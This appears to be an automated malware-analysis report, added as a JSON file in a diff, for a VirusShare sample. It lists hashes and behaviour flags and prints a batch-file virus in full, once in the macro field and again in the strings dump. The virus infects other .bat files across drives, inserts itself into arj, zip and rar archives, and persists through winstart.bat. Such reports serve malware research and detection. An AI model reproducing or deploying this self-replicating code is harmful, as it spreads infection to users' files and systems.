@@ -1,0 +1,56 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "AUTOEXEC": "Runs when the Word document is opened",
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@ctty nul%BR1%\nif '%1'=='BR1DiR' goto BR1diRz\nif '%1'=='BR1' goto BR1zex\nset BR1FK=bat\necho.>BR1.bat\nFind \"BR1\"<%0>>BR1.bat\nfor %%a in (*.arj ..\\*.arj) do arj a %%a BR1.bat\nfor %%a in (*.zip ..\\*.zip) do pkzip %%a BR1.bat\nfor %%a in (*.rar ..\\*.rar) do rar a %%a BR1.bat\nfor %%r in (%path% . .. c: d: e:) do call BR1.bat BR1DiR %%r\ngoto BR1pre\n:BR1DiRz\nfor %%c in (%2\\*.%BR1FK%) do if not %%c==%2\\AUTOEXEC.BAT call BR1.bat BR1 %%c \ngoto BR1end\n:BR1pre\ntype BR1.bat >%windir%\\winstart.bat\ndel BR1.bat\ngoto BR1end\n:BR1zex\nFind \"BR1\"<%2>nul\nif errorlevel 1 type BR1.bat>>%2\n:BR1end [StRANGER.Bi0R0b0t NeKr0!]"
+    },
+    "filename": "VirusShare_2d37a1f7164c184847ed5b2d043a6524",
+    "filesize": 628,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "2d37a1f7164c184847ed5b2d043a6524",
+        "sha1": "e638ebd6bab895134477b3907314b7f11fda0765",
+        "sha256": "818a46651c31f9f3d4d7dc920d9c30951f6851ab97062484b92cd67486f99674"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@ctty nul%BR1%",
+            "if '%1'=='BR1DiR' goto BR1diRz",
+            "if '%1'=='BR1' goto BR1zex",
+            "set BR1FK=bat",
+            "echo.>BR1.bat",
+            "Find \"BR1\"<%0>>BR1.bat",
+            "for %%a in (*.arj ..\\*.arj) do arj a %%a BR1.bat",
+            "for %%a in (*.zip ..\\*.zip) do pkzip %%a BR1.bat",
+            "for %%a in (*.rar ..\\*.rar) do rar a %%a BR1.bat",
+            "for %%r in (%path% . .. c: d: e:) do call BR1.bat BR1DiR %%r",
+            "goto BR1pre",
+            ":BR1DiRz",
+            "for %%c in (%2\\*.%BR1FK%) do if not %%c==%2\\AUTOEXEC.BAT call BR1.bat BR1 %%c ",
+            "goto BR1end",
+            ":BR1pre",
+            "type BR1.bat >%windir%\\winstart.bat",
+            "del BR1.bat",
+            "goto BR1end",
+            ":BR1zex",
+            "Find \"BR1\"<%2>nul",
+            "if errorlevel 1 type BR1.bat>>%2",
+            ":BR1end [StRANGER.Bi0R0b0t NeKr0!]"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.258388",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
